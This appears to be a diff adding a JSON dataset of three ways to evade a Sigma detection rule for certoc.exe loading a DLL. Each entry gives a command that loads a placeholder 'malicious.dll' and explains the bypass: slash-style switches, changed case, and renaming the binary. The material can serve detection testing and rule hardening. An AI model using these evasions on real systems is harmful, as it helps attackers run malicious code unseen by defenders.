@@ -1,0 +1,14 @@
+[
+  {
+    "output": "certoc.exe /LoadDLL C:\\path\\to\\malicious.dll",
+    "explanation": "The original Sigma rule strictly searches for the '-LoadDLL' flag (starting with a dash). On Windows, many command-line utilities treat a forward slash '/' and a dash '-' interchangeably for switches. By using '/LoadDLL', the command executes the same functionality but fails the string match for ' -LoadDLL '."
+  },
+  {
+    "output": "certoc.exe -loaddll C:\\path\\to\\malicious.dll",
+    "explanation": "Depending on the SIEM's specific implementation of 'contains', if the underlying search engine is case-sensitive, changing the case of the argument to lowercase or mixed case (e.g., '-loaddll' or '-LOADDLL') may bypass the detection while remaining functional for the binary."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\certoc.exe C:\\Users\\Public\\not_certoc.exe && C:\\Users\\Public\\not_certoc.exe -LoadDLL C:\\path\\to\\malicious.dll",
+    "explanation": "The rule relies on 'selection_img' matching the image name or OriginalFileName. While OriginalFileName is harder to spoof, some logging configurations (like basic Process Creation 4688 without extra features) only log the Image path. If the 'OriginalFileName' field is missing from the logs, renaming the binary bypasses the first half of the 'all of selection_*' condition."
+  }
+]
